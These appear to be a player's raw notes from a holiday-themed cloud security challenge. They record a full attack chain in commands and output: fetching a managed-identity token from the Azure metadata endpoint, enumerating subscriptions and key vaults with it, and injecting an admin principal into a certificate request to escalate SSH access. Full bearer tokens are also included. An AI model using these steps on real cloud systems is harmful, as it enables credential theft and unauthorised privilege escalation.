ssh-server-vm.santaworkshopgeeseislands.org

https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqxbuAdkroAUPmTy//fOqq7kaKIpLHDqsYxiSBpOkHjLpIPgFa1RfiVIHY2gihBLi8PWyL0MwKfUMSlia+ze1BInhnb6h11wpq4CdGIBBeESWb71f7zio2JE4dLz4okfkuW8rnIwenDIXf2YGr2zR9wB6zKzbX2nWygnDmoNaDWVm+6xJZTEFlyiI9si4sx/aov+11AYXyGtvDyA07wLNZSRBZuiiGSa9TAN4iLqv+sL6l19jVygHPH/ZAx3n96M31MYtBdo6PthWC7nf6yKW/BVzPGVTC7UaznYaeE2Ts0FmHDIW7lUjNjIV9lHlD7VrzMY7QyOJGgygEAp2UCLPp

{
    "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcxNTQ5MzkxNTk1NzY5MTU5NzI3NzY5NDY3ODExNDA3Mzk0MDQxNDQAAAADAQABAAABAQDqxbuAdkroAUPmTy//fOqq7kaKIpLHDqsYxiSBpOkHjLpIPgFa1RfiVIHY2gihBLi8PWyL0MwKfUMSlia+ze1BInhnb6h11wpq4CdGIBBeESWb71f7zio2JE4dLz4okfkuW8rnIwenDIXf2YGr2zR9wB6zKzbX2nWygnDmoNaDWVm+6xJZTEFlyiI9si4sx/aov+11AYXyGtvDyA07wLNZSRBZuiiGSa9TAN4iLqv+sL6l19jVygHPH/ZAx3n96M31MYtBdo6PthWC7nf6yKW/BVzPGVTC7UaznYaeE2Ts0FmHDIW7lUjNjIV9lHlD7VrzMY7QyOJGgygEAp2UCLPpAAAAAAAAAAEAAAABAAAAJGUzYjNkMTIxLWNhNWEtNDg3Mi1hNTU1LTM2ZmFlZmE1NDA2ZgAAAAcAAAADZWxmAAAAAGV+WJ0AAAAAZaNDyQAAAAAAAAASAAAACnBlcm1pdC1wdHkAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAgaTYY0wKYmRc8kcdFAf35MzgJGuyr/sEvTCn4/qsIhYcAAABTAAAAC3NzaC1lZDI1NTE5AAAAQKt57QRoduLTA/ndV+ctP6nFiY1hr2/ObUfHHZuzvwL8030+i1tqbXS6lHdSl7Ox9yRCRFUFX0JEXk6taEZV0Qk= ",
    "principal": "elf"
}


ssh-agent /bin/bash
ssh-add private.pem
ssh -v -i test.cer monitor@ssh-server-vm.santaworkshopgeeseislands.org


monitor@ssh-server-vm:~$ ls /etc/ssh/auth_principals/
alabaster  monitor
monitor@ssh-server-vm:~$ ls /etc/ssh/auth_principals/
alabaster  monitor
monitor@ssh-server-vm:~$ ls -la /etc/ssh/auth_principals/
total 16
drwxr-xr-x 1 root root 4096 Nov  7 21:37 .
drwxr-xr-x 1 root root 4096 Nov  9 14:07 ..
-rw-r--r-- 1 root root    6 Nov  7 21:37 alabaster
-rw-r--r-- 1 root root    4 Nov  7 21:37 monitor
monitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/alabaster
admin
monitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/monitor
elf


monitor@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H "Metadata: true"
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjc4MjU5MSwibmJmIjoxNzAyNzgyNTkxLCJleHAiOjE3MDI4NjkyOTEsImFpbyI6IkUyVmdZSWd5NHVxMGRRNVcvZko2aFZiM2sxTjlBQT09IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6IjJTY0xiNWFhRWsyY0NyWVFnTTVEQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.DiUzE9zkyldHNW_5AbOmRwcSUg-muBlfUppm4BzI6MsZIYKPmbTtYiYFEx2c7sRyEDcdlCFrctzpCdl2Bd_WFo48MNpnSF8XaR7M39Ou8VPQvwQNXxsyUIV051olJjw5f_HSIdjOPEYTvazpHgz4VLY1fQy6O2dZSJxgXkkTboBDXJowkaFI6jUrUkVMBLpfYXrso4zwRtsxG3JNokapCoMGCGMtxLe5h4vTp1waMr3epAEtIMe0QQZnQzz3jK7d4y8B7foJp-YZcRMqJkWkNnkOHJv_kYFjGtORoQ7_xbZn4Xzk4n9P52FTFxY4-4tgq83qWFHrAdjATLdxyLxBkg","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85839","expires_on":"1702869291","ext_expires_in":"86399","not_before":"1702782591","resource":"https://management.azure.com","token_type":"Bearer"}


GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01
name: northpole-ssh-certs-fa
resourceGroupName: northpole-rg1
subscriptionId: 2b0942f3-9bca-484b-a508-abdae2db5e64


tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d

monitor@ssh-server-vm:~$ curl --header "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjc4MjU5MSwibmJmIjoxNzAyNzgyNTkxLCJleHAiOjE3MDI4NjkyOTEsImFpbyI6IkUyVmdZSWd5NHVxMGRRNVcvZko2aFZiM2sxTjlBQT09IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6IjJTY0xiNWFhRWsyY0NyWVFnTTVEQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.DiUzE9zkyldHNW_5AbOmRwcSUg-muBlfUppm4BzI6MsZIYKPmbTtYiYFEx2c7sRyEDcdlCFrctzpCdl2Bd_WFo48MNpnSF8XaR7M39Ou8VPQvwQNXxsyUIV051olJjw5f_HSIdjOPEYTvazpHgz4VLY1fQy6O2dZSJxgXkkTboBDXJowkaFI6jUrUkVMBLpfYXrso4zwRtsxG3JNokapCoMGCGMtxLe5h4vTp1waMr3epAEtIMe0QQZnQzz3jK7d4y8B7foJp-YZcRMqJkWkNnkOHJv_kYFjGtORoQ7_xbZn4Xzk4n9P52FTFxY4-4tgq83qWFHrAdjATLdxyLxBkg" https://management.azure.com/subscriptions?api-version=2019-05-10
{"value":[{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64","authorizationSource":"RoleBased","subscriptionId":"2b0942f3-9bca-484b-a508-abdae2db5e64","tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","displayName":"sans-hhc","state":"Enabled","subscriptionPolicies":{"locationPlacementId":"Public_2014-09-01","quotaId":"EnterpriseAgreement_2014-09-01","spendingLimit":"Off"}}],"count":{"type":"Total","value":1}}

https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/


monitor@ssh-server-vm:~$ curl --header "Authorization: BealXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjc4MjU5MSwibmJmIjoxNzAyNzgyNTkxLCJleHAiOjE3MDI4NjkyOTEsImFpbyI6IkUyVmdZSWd5NHVxMGRRNVcvZko2aFZiM2sxTjlBQT09IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6IjJTY0xiNWFhRWsyY0NyWVFnTTVEQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.DiUzE9zkyldHNW_5AbOmRwcSUg-muBlfUppm4BzI6MsZIYKPmbTtYiYFEx2c7sRyEDcdlCFrctzpCdl2Bd_WFo48MNpnSF8XaR7M39Ou8VPQvwQNXxsyUIV051olJjw5f_HSIdjOPEYTvazpHgz4VLY1fQy6O2dZSJxgXkkTboBDXJowkaFI6jUrUkVMBLpfYXrso4zwRtsxG3JNokapCoMGCGMtxLe5h4vTp1waMr3epAEtIMe0QQZnQzz3jK7d4y8B7foJp-YZcRMqJkWkNnkOHJv_kYFjGtORoQ7_xbZn4Xzk4n9P52FTFxY4-4tgq83qWFHrAdjATLdxyLxBkg" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups?api-v
ersion=2019-05-10
{"value":[{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1","name":"northpole-rg1","type":"Microsoft.Resources/resourceGroups","location":"eastus","tags":{},"properties":{"provisioningState":"Succeeded"}}]}

monitor@ssh-server-vm:~$ curl --header "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjc4MjU5MSwibmJmIjoxNzAyNzgyNTkxLCJleHAiOjE3MDI4NjkyOTEsImFpbyI6IkUyVmdZSWd5NHVxMGRRNVcvZko2aFZiM2sxTjlBQT09IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6IjJTY0xiNWFhRWsyY0NyWVFnTTVEQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.DiUzE9zkyldHNW_5AbOmRwcSUg-muBlfUppm4BzI6MsZIYKPmbTtYiYFEx2c7sRyEDcdlCFrctzpCdl2Bd_WFo48MNpnSF8XaR7M39Ou8VPQvwQNXxsyUIV051olJjw5f_HSIdjOPEYTvazpHgz4VLY1fQy6O2dZSJxgXkkTboBDXJowkaFI6jUrUkVMBLpfYXrso4zwRtsxG3JNokapCoMGCGMtxLe5h4vTp1waMr3epAEtIMe0QQZnQzz3jK7d4y8B7foJp-YZcRMqJkWkNnkOHJv_kYFjGtORoQ7_xbZn4Xzk4n9P52FTFxY4-4tgq83qWFHrAdjATLdxyLxBkg" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2023-07-01
{"value":[{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv","name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}},{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv","name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}}]}

{"value":[{
"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
"name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}},{
"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
"name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}}]}


monitor@ssh-server-vm:~$ curl --header "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjc4MjU5MSwibmJmIjoxNzAyNzgyNTkxLCJleHAiOjE3MDI4NjkyOTEsImFpbyI6IkUyVmdZSWd5NHVxMGRRNVcvZko2aFZiM2sxTjlBQT09IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6IjJTY0xiNWFhRWsyY0NyWVFnTTVEQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.DiUzE9zkyldHNW_5AbOmRwcSUg-muBlfUppm4BzI6MsZIYKPmbTtYiYFEx2c7sRyEDcdlCFrctzpCdl2Bd_WFo48MNpnSF8XaR7M39Ou8VPQvwQNXxsyUIV051olJjw5f_HSIdjOPEYTvazpHgz4VLY1fQy6O2dZSJxgXkkTboBDXJowkaFI6jUrUkVMBLpfYXrso4zwRtsxG3JNokapCoMGCGMtxLe5h4vTp1waMr3epAEtIMe0QQZnQzz3jK7d4y8B7foJp-YZcRMqJkWkNnkOHJv_kYFjGtORoQ7_xbZn4Xzk4n9P52FTFxY4-4tgq83qWFHrAdjATLdxyLxBkg" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01
{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web","name":"northpole-ssh-certs-fa","type":"Microsoft.Web/sites/sourcecontrols","location":"East US","tags":{"project":"northpole-ssh-certs","create-cert-func-url-path":"/api/create-cert?code=candy-cane-twirl"},"properties":{"repoUrl":"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa","branch":"main","isManualIntegration":false,"isGitHubAction":true,"deploymentRollbackEnabled":false,"isMercurial":false,"provisioningState":"Succeeded","gitHubActionConfiguration":{"codeConfiguration":null,"containerConfiguration":null,"isLinux":true,"generateWorkflowFile":true,"workflowSettings":{"appType":"functionapp","publishType":"code","os":"linux","variables":{"runtimeVersion":"3.11"},"runtimeStack":"python","workflowApiVersion":"2020-12-01","useCanaryFusionServer":false,"authType":"publishprofile"}}}}


"repoUrl":"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa"

added "principal":"admin" to post req with burp proxy

{
    "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcyNzkzNTkyMTcxMDIxMTA1OTcyNDE0MDc1NDQyMjE3MzMzNDM4ODQAAAADAQABAAABAQDqxbuAdkroAUPmTy//fOqq7kaKIpLHDqsYxiSBpOkHjLpIPgFa1RfiVIHY2gihBLi8PWyL0MwKfUMSlia+ze1BInhnb6h11wpq4CdGIBBeESWb71f7zio2JE4dLz4okfkuW8rnIwenDIXf2YGr2zR9wB6zKzbX2nWygnDmoNaDWVm+6xJZTEFlyiI9si4sx/aov+11AYXyGtvDyA07wLNZSRBZuiiGSa9TAN4iLqv+sL6l19jVygHPH/ZAx3n96M31MYtBdo6PthWC7nf6yKW/BVzPGVTC7UaznYaeE2Ts0FmHDIW7lUjNjIV9lHlD7VrzMY7QyOJGgygEAp2UCLPpAAAAAAAAAAEAAAABAAAAJDNlNjBjNGFlLTQ4M2YtNDA5ZS05Mzc3LTkwZmViOWUxYjM1MQAAAAkAAAAFYWRtaW4AAAAAZX55pgAAAABlo2TSAAAAAAAAABIAAAAKcGVybWl0LXB0eQAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBpNhjTApiZFzyRx0UB/fkzOAka7Kv+wS9MKfj+qwiFhwAAAFMAAAALc3NoLWVkMjU1MTkAAABAHHBIyC587uWL8XhzjLxpxOfrNnVTQCbrNCmHFzgtVAVL6UgZ9Y05ktB1MXEyHp8Dlbuw3xgq12Zx256NcvbhCg== ",
    "principal": "admin"
}


ssh -v -i admin.cer alabaster@ssh-server-vm.santaworkshopgeeseislands.org

bingoooo


alabaster@ssh-server-vm:~$ cat alabaster_todo.md
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.

objective: what kind of cookie cache? gingerbread
